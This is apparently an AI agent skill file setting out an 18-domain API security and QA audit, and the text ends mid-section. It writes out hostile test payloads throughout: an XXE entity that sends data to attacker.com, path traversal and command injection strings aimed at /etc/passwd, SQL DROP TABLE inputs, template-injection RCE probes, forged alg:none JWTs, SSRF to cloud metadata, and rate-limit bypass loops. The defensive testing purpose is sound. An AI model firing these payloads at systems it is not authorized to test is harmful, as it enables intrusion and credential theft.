---
name: api-deep-qa
description: Use when a REST, GraphQL, or gRPC API needs auditing — AI-generated or hand-written — and you see broken status codes, missing auth, IDOR risks, rate limiting gaps, JWT attack surface, bad URL structure, slow endpoints, webhook security gaps, schema drift, or missing contract tests. Also triggers on: pre-deploy API review, "is our API secure?", "why is this endpoint slow?", API fuzzing, or response payload audit.
---

# API Deep QA

## Mission

Act as a strict API QA engineer. Audit a REST, GraphQL, or gRPC API across 18 check domains: correctness, OWASP security, performance, response quality, URL hygiene, contract integrity, JWT/OAuth2 attacks, advanced injection, rate limiting bypass, GraphQL-specific, gRPC-specific, webhook security, load testing, contract testing, fuzzing, HTTP/2 & HTTP/3, content negotiation, and observability. Assume the API may contain AI-generated routes with no auth, wrong status codes, JWT algorithm confusion, no rate limiting, verbose error messages leaking internals, and no input validation.

## Non-negotiable rule

**Never send destructive requests without explicit confirmation.**

Never call `DELETE`, `POST` to payment/order endpoints, or any mutation that cannot be undone without explicit user confirmation and a safe test environment. Read endpoints freely; write endpoints require a staging environment or explicit approval.

## Initial assumptions to state

At the start of the report, state:

- base URL and API type (REST, GraphQL, gRPC)
- authentication mechanism detected (Bearer JWT, API key, session cookie, OAuth2, none)
- whether source code is available for static analysis
- framework detected (Express, FastAPI, Django REST, Rails API, NestJS, Spring Boot, etc.)
- whether OpenAPI/Swagger spec exists
- which checks were skipped and why

---

## Discovery phase

### Source code inspection

Scan for route definitions:

```bash
# Express / Node
grep -rn "router\.\|app\.get\|app\.post\|app\.put\|app\.delete\|app\.patch" src/ --include="*.ts" --include="*.js"

# FastAPI / Python
grep -rn "@app\.\|@router\." --include="*.py" .

# Django
find . -name "urls.py" | xargs grep -n "path\|re_path\|url"

# Rails
grep -rn "resources\|get\|post\|put\|delete\|patch" config/routes.rb

# NestJS
grep -rn "@Get\|@Post\|@Put\|@Delete\|@Patch\|@Controller" --include="*.ts" src/
```

Collect:
- all route paths and HTTP methods
- authentication middleware applied (or missing)
- request body schemas / validation libraries used
- response serializers / DTOs
- rate limiting middleware presence
- CORS configuration

### OpenAPI / Swagger

If spec exists (`openapi.json`, `swagger.yaml`, `docs/`):
- list all endpoints, methods, and authentication requirements
- identify endpoints with no `security` field → unauthenticated by design or oversight?
- identify endpoints with no request body schema → no server-side validation?

### Postman / Insomnia collections

If `*.postman_collection.json` or `.insomnia/` exists, import and cross-reference against source routes to detect undocumented endpoints.

---

## Check 1 — Endpoint correctness

For every endpoint, verify:

### HTTP method semantics

| Method | Must be | Must not |
|--------|---------|---------|
| `GET` | Idempotent, no side effects | Modify state, accept request body for filtering (use query params) |
| `POST` | Create a resource or trigger action | Be used for updates |
| `PUT` | Replace entire resource | Partially update (use PATCH) |
| `PATCH` | Partial update | Replace entire resource |
| `DELETE` | Remove resource | Return body on success (optional, but common) |

Flag: `GET` endpoints that modify state, `POST` used for updates, `DELETE` that requires a body.

### HTTP status code correctness

| Situation | Correct code | Wrong |
|-----------|-------------|-------|
| Resource created | `201 Created` | `200 OK` |
| No content to return | `204 No Content` | `200 {}` |
| Validation error | `400 Bad Request` | `200 { error: "..." }` |
| Unauthenticated | `401 Unauthorized` | `403 Forbidden` |
| Authenticated but no permission | `403 Forbidden` | `401 Unauthorized` |
| Resource not found | `404 Not Found` | `200 null` or `400` |
| Method not allowed | `405 Method Not Allowed` | `404` |
| Conflict (duplicate) | `409 Conflict` | `400` or `500` |
| Rate limited | `429 Too Many Requests` | `400` or `500` |
| Unhandled server error | `500 Internal Server Error` | Leaking stack trace in body |

### Content-Type headers

- Request: `Content-Type: application/json` on POST/PUT/PATCH
- Response: `Content-Type: application/json; charset=utf-8`
- File uploads: `multipart/form-data` (not JSON)
- Flag: missing `Content-Type` on response, mismatched types

### Input handling

Test every endpoint with:

```
empty string          null value           very long string (>10k chars)
special chars         emoji                HTML tags <script>alert(1)</script>
SQL: ' OR 1=1 --      negative number      zero                very large number
missing required field  extra unexpected field  wrong type (string for int)
```

Expected: 400 with clear error, not 500 with stack trace.

### Error response shape

Every error response must be consistent. Flag inconsistency:

```json
// ✅ Consistent shape
{ "error": "Validation failed", "details": [{ "field": "email", "message": "Invalid format" }] }

// ❌ Inconsistent — three different shapes across endpoints
{ "message": "Not found" }
{ "error_code": 404, "text": "no user" }
"Internal Server Error"
```

---

## Check 2 — Security (OWASP API Top 10)

### 1. Broken Object Level Authorization (BOLA / IDOR)

Most critical API vulnerability. Every endpoint that takes a resource ID must verify the requester owns or has permission to access that resource.

```
# Test: access another user's resource
GET /api/users/1/orders           # as user with id=2 — should return 403, not 200
GET /api/orders/1001              # order belonging to different user
PATCH /api/posts/42               # post authored by different user
```

Static analysis check:

```python
# ❌ No ownership check — fetches any resource by ID
order = Order.get(id=request.params.id)

# ✅ Ownership enforced at query level
order = Order.get(id=request.params.id, user_id=current_user.id)
```

**Severity: Critical if confirmed.**

### 2. Broken Authentication

Check every protected endpoint:

```bash
# Remove auth header entirely
curl -X GET https://api.example.com/users/me
# Expected: 401 — not 200

# Use expired token
# Expected: 401 with "token expired" — not 200 or 500

# Use token from user A to access user B's data
# Expected: 403 — not 200
```

JWT-specific checks:

```bash
# Algorithm confusion: set alg to "none"
header = base64({"alg":"none","typ":"JWT"})
# Expected: rejected — not accepted

# Check HS256 vs RS256: if server uses HS256, can attacker sign with public key as secret?
# Check expiry: is exp claim validated?
# Check issuer: is iss claim validated?
# Check audience: is aud claim validated?
```

API key checks:

- API key in URL query param (`?api_key=...`) — logs the key, flag as High
- API key in `Authorization: Bearer` header — correct
- API key in response body — flag Critical

### 3. Broken Object Property Level Authorization

**Mass assignment**: does the API accept and store fields the user should not control?

```json
// ❌ Accepts role, admin flag, or internal fields
PATCH /api/users/me
{ "name": "Alice", "role": "admin", "verified": true, "credit_balance": 99999 }
// If 200 and fields are saved: Critical
```

**Excessive data exposure**: does the response include fields the client should not receive?

```json
// ❌ Returns hashed password, internal flags, other users' emails
GET /api/users/me
{
  "id": 1,
  "email": "user@example.com",
  "password_hash": "$2b$12$...",     // ❌ Critical
  "is_admin": false,
  "stripe_customer_id": "cus_..."    // ❌ PII leak
}
```

### 4. Unrestricted Resource Consumption

Test rate limiting on:

```bash
# Auth endpoint — brute force protection
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://api.example.com/auth/login \
    -d '{"email":"user@example.com","password":"wrong"}';
done
# Expected: 429 after N attempts — not 20× 401
```

Check:
- No `X-RateLimit-Limit` / `X-RateLimit-Remaining` headers?
- No `Retry-After` header on 429?
- Unbounded `limit` query param? (`GET /orders?limit=99999999`)
- No max page size enforced?
- File upload with no size limit?

### 5. Broken Function Level Authorization

Admin or privileged endpoints accessible to regular users:

```bash
# As regular authenticated user:
GET  /api/admin/users           # Should 403, not 200
POST /api/admin/users/ban       # Should 403
GET  /api/internal/metrics      # Should 403 or 404
DELETE /api/users/{any_user_id} # Should 403 unless admin
```

Static check: verify admin-only routes have an authorization middleware distinct from basic auth.

### 6. Security Misconfiguration

**CORS:**

```bash
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS https://api.example.com/users

# ❌ Critical: wildcard + credentials
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true  (browsers block this, but flag it)

# ❌ High: reflects arbitrary origin
# Access-Control-Allow-Origin: https://evil.com
```

**Security headers (API responses):**

| Header | Expected value |
|--------|---------------|
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
| `Content-Security-Policy` | Present on HTML responses |
| `X-Powered-By` | Absent (reveals framework/version) |
| `Server` | Should not reveal version (e.g., `nginx/1.18.0`) |

**Verbose error messages:**

```json
// ❌ Leaks internals
{
  "error": "SequelizeDatabaseError: column \"user_id\" does not exist",
  "stack": "at /app/node_modules/sequelize/lib/dialects..."
}

// ✅ Safe
{ "error": "Internal server error", "reference": "ERR-2026-05-XYZ" }
```

**Debug endpoints in production:**

```bash
GET /api/debug         # Should 404 in production
GET /api/health        # OK if intentional
GET /swagger-ui.html   # Should require auth or be disabled in production
GET /api-docs          # Should require auth or be disabled in production
```

### 7. Server-Side Request Forgery (SSRF)

Any endpoint that accepts a URL and fetches it server-side:

```bash
# ❌ Test with internal address
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/" }  # AWS metadata
{ "url": "http://localhost:6379" }                       # Redis
{ "url": "http://internal-service:8080/admin" }         # Internal service
```

Expected: request rejected or response contains no internal data.

### 8. Injection via API parameters

```bash
# SQL injection via query param
GET /api/users?filter=name&value='; DROP TABLE users; --

# NoSQL injection (MongoDB)
POST /api/auth/login
{ "email": { "$gt": "" }, "password": { "$gt": "" } }

# Template injection
GET /api/render?template={{7*7}}
# Expected: not "49" in response

# Path traversal
GET /api/files/../../../etc/passwd
GET /api/download?path=../../config/.env
```

---

## Check 3 — Performance and speed

### Response time baseline

For every endpoint, measure response time under normal conditions:

```bash
curl -o /dev/null -s -w "Time: %{time_total}s\n" https://api.example.com/endpoint
```

Thresholds (guide, adjust for your SLA):

| Endpoint type | Target | Flag |
|--------------|--------|------|
| Simple read (no DB) | < 50ms | > 200ms |
| Single DB lookup | < 100ms | > 500ms |
| List with filters | < 200ms | > 1000ms |
| Complex aggregation | < 500ms | > 2000ms |
| File upload/process | < 2000ms | > 10000ms |

### N+1 detection

Monitor DB query count per API call. If `GET /orders` runs N+1 queries (one for orders + one per order for user data), flag it and recommend eager loading.

```bash
# Enable query logging and count queries per API request
# Express + Sequelize: add query counter middleware
# Rails: use rack-mini-profiler or check logs
# FastAPI + SQLAlchemy: set echo=True temporarily
```

### Slow query identification

For endpoints exceeding thresholds:

1. Add request timing logs: time before/after DB calls
2. Run `EXPLAIN ANALYZE` on the slowest query
3. Check for missing indexes on filtered/sorted columns
4. Check for unbounded queries (no `LIMIT`)

### Payload size audit

```bash
curl -sI https://api.example.com/products | grep content-length
# or
curl -s https://api.example.com/products | wc -c
```

Flag responses > 100KB on list endpoints. Common causes:
- `SELECT *` returning all columns including large text/blob fields
- No pagination (returns entire table)
- Nested objects included when not needed

### Compression

```bash
curl -H "Accept-Encoding: gzip" -sI https://api.example.com/products | grep content-encoding
# Expected: content-encoding: gzip
# Flag if absent on responses > 1KB
```

### Connection and keep-alive

```bash
curl -sI https://api.example.com/ | grep -i connection
# Expected: Connection: keep-alive
```

### Caching

Check `Cache-Control` headers on read endpoints:

```bash
curl -sI https://api.example.com/products/1 | grep -i cache
```

Flag:
- Public read-only endpoints with no `Cache-Control` or `ETag`
- User-specific endpoints with `Cache-Control: public` (data leak risk)
- Missing `Vary: Authorization` when cached responses are user-scoped

---

## Check 4 — Response quality and tuning

### Payload minimization

Does each endpoint return only what the client needs?

```json
// ❌ Over-fetching — returns 40 fields when client uses 5
GET /api/users/me → { id, email, name, role, created_at, updated_at,
                      password_hash, stripe_id, internal_flags, ... }

// ✅ Lean — returns only what UI needs
GET /api/users/me → { id, email, name, role }
```

Recommendations:
- Add `?fields=id,name,email` sparse fieldset support for large resources
- Use response DTOs/serializers to whitelist output fields explicitly

### Consistency checks

**Date formats:**

```json
// ❌ Mixed formats in same API
{ "created_at": "2026-05-23", "updated_at": 1716480000, "expires": "May 23 2026" }

// ✅ ISO 8601 consistently
{ "created_at": "2026-05-23T10:00:00Z", "updated_at": "2026-05-23T11:00:00Z" }
```

**Naming conventions:**

All JSON keys consistent: camelCase (`createdAt`) or snake_case (`created_at`). Never mixed.

**Null vs absent:**

Decide and apply consistently: missing optional field → `null` or omit the key entirely? Mixed behavior breaks clients.

**Boolean naming:**

`is_active`, `has_subscription`, `can_edit` — not `active: 1`, `subscribed: "yes"`.

**Envelope consistency:**

```json
// ❌ Some endpoints use envelope, some don't
GET /users    → { "data": [...], "total": 100 }
GET /products → [...]

// ✅ Consistent envelope everywhere
GET /users    → { "data": [...], "meta": { "total": 100, "page": 1 } }
GET /products → { "data": [...], "meta": { "total": 50, "page": 1 } }
```

### Pagination

Every list endpoint that can return >100 items must have pagination:

```json
// ✅ Cursor-based (preferred for large datasets)
GET /api/events?after=cursor_abc123&limit=20
→ { "data": [...], "next_cursor": "cursor_xyz789", "has_more": true }

// ✅ Page-based (simpler, degrades at scale)
GET /api/orders?page=2&per_page=20
→ { "data": [...], "meta": { "page": 2, "per_page": 20, "total": 843 } }

// ❌ No pagination
GET /api/orders → [...all 50000 orders...]
```

### Error response shape

Consistent, informative, non-leaky:

```json
// ✅ Good error shape
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Request validation failed",
    "details": [
      { "field": "email", "message": "Must be a valid email address" },
      { "field": "age", "message": "Must be a positive integer" }
    ]
  }
}

// ❌ Too vague
{ "error": true }

// ❌ Leaks internals
{ "error": "PG::NotNullViolation: null value in column \"user_id\"" }
```

---

## Check 5 — URL structure and hygiene

### RESTful naming

| Rule | ✅ Correct | ❌ Wrong |
|------|-----------|---------|
| Use plural nouns for collections | `/users`, `/orders` | `/user`, `/getUsers` |
| No verbs in path | `/orders/{id}/cancel` (POST) | `/cancelOrder/{id}` |
| Nested for ownership | `/users/{id}/posts` | `/getUserPosts?userId={id}` |
| Actions as sub-resources | `POST /orders/{id}/refund` | `GET /refundOrder?id={id}` |
| Lowercase paths | `/api/user-profiles` | `/api/UserProfiles` |
| Hyphens for multi-word | `/api/user-profiles` | `/api/user_profiles` or `/api/userProfiles` |

### API versioning

Must have versioning for any public or client-facing API:

```bash
# ✅ URL versioning (most visible)
/api/v1/users
/api/v2/users

# ✅ Header versioning
Accept: application/vnd.api+json;version=1

# ❌ No versioning — breaking changes affect all clients immediately
/api/users
```

Check: is the version in the path, header, or missing entirely?

### Sensitive data in URLs

```bash
# ❌ Critical: secrets/tokens in URL path or query string
GET /api/reset-password?token=eyJhbGciOiJIUzI1NiJ9...
GET /api/users?api_key=sk-live-abc123
GET /api/export?session=abc123

# ✅ Token in header
POST /api/auth/reset-password
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

URLs are logged by servers, proxies, CDNs, browsers, and analytics tools. Never put secrets in URLs.

### Query parameter conventions

```bash
# ✅ Consistent, lowercase, underscore-separated
GET /api/orders?start_date=2026-01-01&end_date=2026-05-01&order_status=pending

# ❌ Inconsistent
GET /api/orders?startDate=2026-01-01&end-date=2026-05-01&OrderStatus=pending
```

Check:
- Sort: `?sort=created_at&order=desc` or `?sort=-created_at` — pick one convention
- Filter: `?status=active` or `?filter[status]=active` — pick one convention
- Search: `?q=term` or `?search=term` — consistent across endpoints
- Sparse fields: `?fields=id,name` or `?include=id,name`

### Trailing slash consistency

Pick one convention and enforce it:

```bash
GET /api/users/    → redirect to /api/users or 404? Decide and make consistent.
```

Trailing slashes that 404 instead of redirect cause unnecessary client errors.

### URL encoding

Test URLs with special characters in path segments:

```bash
GET /api/users/user%40example.com     # @ encoded
GET /api/search?q=hello%20world       # space encoded
GET /api/tags/c%2B%2B                 # + encoded
```

Expected: handled correctly, not causing 400 or 500.

### Path traversal in URL

```bash
GET /api/files/../../etc/passwd
GET /api/documents/%2e%2e%2fetc%2fpasswd
```

Expected: 400 or 404, never file system access.

---

## Check 6 — Contract and schema integrity

### OpenAPI spec drift

If an OpenAPI spec exists, verify it matches the actual implementation:

- Call every documented endpoint — does it exist?
- Call with documented request shape — does it work?
- Check response against documented schema — does it match?
- Are undocumented endpoints deployed? (shadow routes = security gap)

### Breaking change detection

Flag changes that break existing clients:

| Change | Breaking? |
|--------|-----------|
| Remove a field from response | ✅ Breaking |
| Rename a field | ✅ Breaking |
| Change a field's type | ✅ Breaking |
| Add a required request field | ✅ Breaking |
| Remove an endpoint | ✅ Breaking |
| Add an optional response field | ❌ Non-breaking |
| Add a new endpoint | ❌ Non-breaking |
| Change status code (e.g., 200 → 201) | ✅ Breaking |

### Idempotency

`GET`, `PUT`, `DELETE` must be idempotent:

```bash
# DELETE twice — second should 404 or 200/204, not 500
DELETE /api/orders/1
DELETE /api/orders/1   # Expected: 404 Not Found, not 500

# PUT same payload twice — same result
PUT /api/users/1 { "name": "Alice" }
PUT /api/users/1 { "name": "Alice" }   # Expected: same 200, no side effects
```

### POST idempotency keys

For payment, order, or mutation endpoints that must not double-execute:

```bash
# ✅ Idempotency key header prevents double-charge
POST /api/payments
Idempotency-Key: client-generated-uuid-abc123
```

Flag high-value POST endpoints (payments, orders, bookings) without idempotency key support.

---

## Check 7 — JWT & OAuth2 attack testing

### JWT-specific attacks

```bash
# 1. Algorithm confusion: alg:none
# Craft token with "alg":"none" and no signature — server must reject
header = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"sub":"admin","exp":9999999999})
token = header + "." + payload + "."
# Expected: 401 — not 200

# 2. RS256 → HS256 confusion
# Server uses RS256 (public key known). Sign token with HS256 using public key as HMAC secret.
# Many libraries accept this. Expected: 401.

# 3. kid header injection
# kid = path to known file on server (empty or constant value)
{"alg":"HS256","kid":"../../dev/null"}  # HMAC secret becomes empty string
{"alg":"HS256","kid":"../../../proc/sys/kernel/hostname"}

# 4. Claim validation — test each individually
# - exp in the past → must return 401
# - nbf in the future → must return 401
# - iss wrong value → must return 401
# - aud wrong value → must return 401

# 5. Token revocation after logout
# 1. Login → get token
# 2. Logout
# 3. Reuse token → must return 401, not 200 (stateless JWTs often miss this)

# 6. JWT in localStorage vs httpOnly cookie
# Check: can document.cookie access the token? Can JS (XSS) steal it?
# Flag: JWT in localStorage = XSS-stealable
```

### OAuth2 / OIDC attacks

```bash
# Redirect URI manipulation
GET /oauth/authorize?client_id=app&redirect_uri=https://evil.com&response_type=code
# Expected: rejected — not 302 to evil.com

# State parameter CSRF
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback&response_type=code
# Omit state param entirely
# Expected: server requires state — CSRF protection

# PKCE bypass (OAuth 2.1 requires PKCE)
# Attempt auth code exchange without code_verifier
POST /oauth/token
{ "grant_type": "authorization_code", "code": "...", "redirect_uri": "..." }
# No code_verifier — must fail

# Scope escalation
GET /oauth/authorize?scope=admin:write  # request elevated scope not granted to client
# Expected: scope ignored or rejected

# Implicit flow still enabled (deprecated in OAuth 2.1)
GET /oauth/authorize?response_type=token  # implicit flow
# Expected: 400 unsupported_response_type in production
```

### API key testing

```bash
# Key in URL — logs exposure
GET /api/data?api_key=sk-live-abc123       # ❌ in URL = in logs/browser history
GET /api/data?access_token=eyJ...          # ❌

# Key in Authorization header — correct
curl -H "Authorization: Bearer sk-live-abc123" https://api.example.com/data  # ✅

# Key scope limits
# A read-only key must not write:
curl -X POST -H "Authorization: Bearer read-only-key" https://api.example.com/orders
# Expected: 403

# Key enumeration — must be random UUID-level entropy, not sequential
# sk-live-1, sk-live-2 → enumerable — flag Critical
```

---

## Check 8 — Advanced injection

### XXE (XML-accepting endpoints)

Test any endpoint that accepts `Content-Type: application/xml`, SOAP, SVG upload, DOCX/XLSX upload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

```xml
<!-- Blind XXE via OOB exfiltration -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=exfil">]>
```

Expected: entity not resolved, file contents not in response.

### Server-Side Template Injection (SSTI)

Test string input fields that may be rendered through a template engine:

```
{{7*7}}          → if response contains "49" → SSTI confirmed
${7*7}           → Java EL / Freemarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
{{ ''.__class__.__mro__[2].__subclasses__() }}   → Python Jinja2 RCE probe
```

Test in: email templates, report generation endpoints, notification APIs, `message` / `subject` / `template` fields.

### Prototype pollution (Node.js APIs)

```json
POST /api/merge-settings
{
  "__proto__": { "admin": true },
  "isAdmin": true,
  "constructor": { "prototype": { "polluted": true } }
}
```

After sending: check if `GET /api/users/me` returns `"admin": true` or `"polluted": true`.
Affects: `lodash.merge`, `jQuery.extend`, `Object.assign` with user-controlled keys.

### HTTP method override abuse

Some frameworks honor `X-HTTP-Method-Override` or `_method` to tunnel DELETE/PUT through POST:

```bash
# Bypass method-based access control
POST /api/admin/users/1
X-HTTP-Method-Override: DELETE

POST /api/admin/users/1?_method=DELETE
```

Expected: override header ignored, or requires same permissions as the actual method.

### Command injection

In file-processing, conversion, or shell-invoking endpoints:

```
filename: "test.pdf; whoami"
filename: "test.pdf | cat /etc/passwd"
filename: "`id`"
query: "data$(id)"
```

### HTTP header injection / response splitting

Inject `\r\n` into header-reflected values:

```bash
curl -H "X-Custom-Header: injected\r\nSet-Cookie: session=hijacked" https://api.example.com/
```

---

## Check 9 — Rate limiting deep dive

### Rate limit headers on every response

Must be present on ALL responses (not just 429):

```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 87
X-RateLimit-Reset: 1716480060
Retry-After: 30   ← on 429 responses
```

Flag: absent on any non-429 response.

### Bypass techniques — test all of these

```bash
# 1. IP spoofing via headers
curl -H "X-Forwarded-For: 1.2.3.$(( RANDOM % 254 ))" https://api.example.com/auth/login
# Rate limit must track by identity, not IP header

# 2. Different X-Forwarded-For per request
for i in $(seq 1 50); do
  curl -H "X-Forwarded-For: 10.0.0.$i" -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://api.example.com/auth/login -d '{"email":"a@b.com","pass":"x"}'
done
# All requests from "different IPs" — expected: same account still gets locked

# 3. X-Real-IP, CF-Connecting-IP, True-Client-IP, X-Client-IP
# Same as above — try each header variant

# 4. HTTP method variation
GET /resource   → 20 requests → rate limited?
POST /resource  → 20 requests → separate bucket? Should share if same logical resource

# 5. Parameter variation
GET /search?q=term1  GET /search?q=term2  → same rate limit bucket?

# 6. User-level vs IP-level
# Authenticated: limits must be per-user-identity, not per-IP
# Verify: same user from two different IPs shares the same rate limit

# 7. Burst allowance
# Verify burst limits are documented and enforced
# Send 10 requests simultaneously — is short burst allowed above sustained rate?
```

### Business flow rate limits (API6)

Beyond endpoint-level limits, protect business actions:

```bash
# Coupon redemption
for i in $(seq 1 100); do POST /api/coupons/SAVE10/redeem; done
# Expected: limit per user per coupon code, not just per IP

# Account creation
for i in $(seq 1 50); do POST /api/auth/register -d '{"email":"test$i@x.com","pass":"pass"}'; done
# Expected: registration rate limit, CAPTCHA trigger, or similar

# Password reset
for i in $(seq 1 20); do POST /api/auth/reset -d '{"email":"victim@x.com"}'; done
# Expected: limit on resets per email address per time window
```

---

## Check 10 — GraphQL-specific security

### Introspection in production

```graphql
{ __schema { types { name fields { name } } } }
```

Expected: disabled in production (`{"errors":[{"message":"GraphQL introspection is not allowed"}]}`).

### Depth limit (DoS via nested queries)

```graphql
{ user { friends { friends { friends { friends { friends { id } } } } } } }
```

Expected: rejected with depth limit error. Without a depth limit, one request can exhaust server resources.

### Alias attack (batch query bypass)

Sends 1000 mutations in one HTTP request — each alias is a separate operation:

```graphql
mutation {
  a1: login(email:"a@b.com", pass:"pass1") { token }
  a2: login(email:"a@b.com", pass:"pass2") { token }
  a3: login(email:"a@b.com", pass:"pass3") { token }
  # ... 997 more
}
```

Expected: query complexity limit rejects this. Without it, rate limiting is bypassed entirely.

### Query complexity limit

Define a max complexity score (each field = 1 point, nested = multiplied). Reject queries above the threshold.

Test with the alias attack above plus deeply recursive fragments.

### Field-level authorization

```graphql
query {
  user(id: 1) {
    email       # public field
    salary      # should require admin scope
    ssn         # should require admin scope
  }
}
```

Verify sensitive fields enforce auth independently — not just the top-level operation.

### Circular fragment references (DoS)

```graphql
fragment A on User { ...B }
fragment B on User { ...A }
{ user(id:1) { ...A } }
```

Expected: rejected — not infinite loop.

### Subscription security (WebSocket)

WebSocket upgrade for subscriptions must enforce the same auth as queries/mutations. Test:

```bash
wscat -c "wss://api.example.com/graphql" --no-auth
# Send subscription without auth header
# Expected: connection rejected or subscription data refused
```

### GraphQL injection

```graphql
query { user(name: "'; DROP TABLE users; --") { id } }
```

Test string arguments with SQL/NoSQL injection payloads — resolvers may forward directly to DB.

### Tools

```bash
# Security audit
graphql-cop -t https://api.example.com/graphql

# Introspection + schema visualization
npx get-graphql-schema https://api.example.com/graphql

# Property-based testing from schema
schemathesis run --app=graphql https://api.example.com/graphql
```

---

## Check 11 — gRPC-specific security

### Server reflection in production

```bash
grpcurl -plaintext localhost:50051 list
# Expected: UNIMPLEMENTED or permission denied in production
# Server reflection enabled = all service methods discoverable by anyone
```

### mTLS enforcement

```bash
# Test with no client certificate
grpcurl -plaintext api.example.com:443 mypackage.MyService/MyMethod
# Expected: connection refused or UNAUTHENTICATED

# Test with certificate from different CA
grpcurl -cacert wrong-ca.pem -cert client.pem -key client.key api.example.com:443 ...
# Expected: TLS handshake failure
```

### Malformed protobuf handling

Send truncated, extra-field, or wrong wire-type protobuf:

```bash
# Send random bytes as gRPC body
printf '\x00\x00\x00\x00\x05\xff\xfe\xfd\xfc\xfb' | grpcurl --data-stdin ...
# Expected: INVALID_ARGUMENT, not panic/500
```

### Streaming endpoint abuse

```bash
# Long-running stream that holds server resources
# 1. Open bidirectional stream
# 2. Send 1 message every 60 seconds indefinitely
# 3. Verify server enforces stream timeout or max duration
```

### Deadline propagation

```bash
# Set a 100ms deadline — verify it propagates to all downstream calls
grpcurl -max-time 0.1 api.example.com:443 mypackage.MyService/HeavyMethod
# Expected: DEADLINE_EXCEEDED, not hang; downstream services also cancelled
```

### Error status code correctness

| gRPC Status | When to use |
|-------------|------------|
| `INVALID_ARGUMENT` | Bad request payload |
| `UNAUTHENTICATED` | Missing / invalid auth |
| `PERMISSION_DENIED` | Authenticated but not authorized |
| `NOT_FOUND` | Resource does not exist |
| `ALREADY_EXISTS` | Duplicate resource |
| `RESOURCE_EXHAUSTED` | Rate limited |
| `INTERNAL` | Unexpected server error — must not leak details |

### Tools

```bash
grpcurl    # curl for gRPC — endpoint discovery and testing
ghz        # gRPC load testing
postman    # GUI with gRPC support
```

---

## Check 12 — Webhook security

### HMAC signature verification

Every webhook consumer must verify the payload signature:

```bash
# Test 1: Valid signature — must accept
# Test 2: No signature header — must reject (400 or 401)
# Test 3: Wrong HMAC secret — must reject
# Test 4: Valid signature, modified payload body — must reject

# Verify constant-time comparison (not vulnerable to timing attacks)
# Timing-safe: hmac.compare_digest(expected, received)
# NOT timing-safe: expected == received  ← can leak signature byte-by-byte via response time
```

### Replay attack prevention

```bash
# Test 1: Valid webhook with timestamp > 5 minutes ago — must reject
X-Webhook-Timestamp: <unix_timestamp_6_minutes_ago>

# Test 2: Same webhook delivered twice with same timestamp — must reject second delivery
# Implementation: cache (signature + timestamp) for the tolerance window
```

### SSRF via webhook target URL

If your service accepts webhook delivery URLs from users:

```bash
POST /api/webhooks
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }  # AWS metadata
{ "url": "http://localhost:6379" }   # Redis
{ "url": "http://192.168.1.1/admin" }  # Internal network
{ "url": "file:///etc/passwd" }       # Local file
{ "url": "dict://localhost:6379/info" }  # Dict protocol
```

Expected: all rejected. Use an allowlist of HTTPS external URLs, block RFC1918 + loopback + cloud metadata ranges.

### Payload size limits

```bash
# Send 50MB webhook payload
# Expected: 413 Payload Too Large, not OOM crash
```

### TLS validation on outbound webhooks

When your server sends webhooks to external URLs, verify it validates the TLS certificate:

```python
# ❌ Insecure
requests.post(webhook_url, verify=False)

# ✅ Secure
requests.post(webhook_url, verify=True)  # default, but verify it's not overridden
```

---

## Check 13 — Performance & load testing patterns

### Test types — all required for production APIs

| Type | Goal | Tool |
|------|------|------|
| Smoke | 1 user, verify baseline | k6: 1 iteration |
| Load | Expected peak traffic | k6 ramping-vus stages |
| Stress | Find breaking point | Artillery: ramp past SLO |
| Spike | Sudden burst | k6: instant high VU jump |
| Soak / Endurance | Memory leaks, resource exhaustion over time | Locust: 4–8 hours sustained |
| Breakpoint | Find exact saturation point | k6 ramping-arrival-rate |

### k6 — key patterns

```javascript
// ✅ Arrival rate (open model) — realistic throughput simulation
export const options = {
  scenarios: {
    api_load: {
      executor: 'constant-arrival-rate',
      rate: 100,          // 100 requests/sec
      timeUnit: '1s',
      duration: '5m',
      preAllocatedVUs: 50,
      maxVUs: 200,
    }
  },
  // ✅ Thresholds as CI gates — fail the test, not just report
  thresholds: {
    http_req_duration: ['p(95)<500', 'p(99)<1000'],
    http_req_failed: ['rate<0.01'],  // < 1% error rate
    http_req_duration: ['p(50)<200'],
  }
};
```

**Common mistake**: using fixed VU count (closed model) instead of arrival rate (open model). Fixed VUs underestimate queueing effects — a server that's slow at 100 VUs may be fine at 100 req/sec if they finish fast.

### Key metrics to assert (not just observe)

- **p50, p95, p99** — never averages alone (averages hide tail latency)
- **Error rate** < threshold
- **Throughput** (requests/sec) vs target
- **TTFB** (Time To First Byte)
- **Connection refused / timeout count**

### Commonly missed performance checks

```bash
# DB connection pool exhaustion under load
# Symptom: sudden spike in 500 errors after pool is exhausted
# Test: send 200 concurrent requests to a DB-heavy endpoint when pool is 20
# Expected: graceful queuing or 503, not unhandled errors

# Memory leak — compare before/after soak test
# Before: record heap size
# After 8 hours: record heap size again
# Expected: same ± 10%, not 4× growth

# Cache effectiveness
# Expected: cache hit rate > 90% on read-heavy endpoints under load

# Slow dependency injection (Toxiproxy)
# Add 200ms latency to DB connection
# Expected: p99 degrades gracefully, no cascading failures
```

---

## Check 14 — Contract testing & schema drift

### OpenAPI spec completeness

Verify spec covers:

- Every deployed endpoint (use traffic logs or DAST proxy to find undocumented routes)
- Every response status code: not just `200` — `400`, `401`, `403`, `404`, `409`, `422`, `429`, `500`, `503` each with schema
- All error responses use the same error schema shape
- Every `security` scheme applied to every operation (no missing security declarations)
- Request bodies have `required` array (missing = all fields appear optional to code generators)
- All enum values listed (changes to enums are breaking)
- Deprecated operations marked `deprecated: true` with migration note

### Breaking change detection

```bash
# oasdiff — diff two OAS specs
